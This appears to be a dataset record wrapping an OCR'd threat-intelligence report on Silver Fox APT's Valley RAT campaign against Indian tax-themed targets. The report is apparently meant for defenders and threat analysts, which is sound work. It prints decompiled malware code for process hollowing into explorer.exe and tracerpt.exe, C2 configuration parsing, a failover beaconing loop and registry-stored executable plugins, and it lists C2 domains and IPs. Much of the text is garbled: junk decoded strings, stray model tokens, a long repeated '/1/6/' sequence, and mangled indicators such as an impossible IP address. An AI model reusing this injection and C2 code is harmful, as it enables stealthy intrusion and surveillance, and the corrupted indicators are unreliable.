td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "if(!CreateProcessA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\",0,0,0,0,CREATE_SUSPENDED|CREATE_NO_WINDOW,0,0,&StartupInfo,&ProcessInformation))", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "CloseHandle(ProcessInformation.hThread);\nCloseHandle(ProcessInformation.hProcess);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/